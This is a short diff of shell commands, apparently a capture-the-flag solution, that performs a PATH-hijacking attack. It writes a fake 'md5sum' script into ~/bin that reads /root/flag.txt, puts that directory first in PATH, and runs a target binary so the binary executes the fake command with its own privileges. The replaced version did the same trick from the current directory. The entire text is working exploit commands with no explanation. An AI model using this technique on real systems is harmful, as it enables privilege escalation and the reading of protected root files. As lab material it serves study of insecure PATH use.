@@ -1,3 +1,5 @@
-echo -e '#!/bin/bash\ncat "$@"\n/bin/md5sum "$@"' > md5sum
-chmod +x md5sum
-PATH=.:$PATH ./<file>
+mkdir -p ~/bin
+echo -e '#!/bin/bash\ncat /root/flag.txt' > ~/bin/md5sum
+chmod +x ~/bin/md5sum
+export PATH=~/bin:$PATH
+./<file>
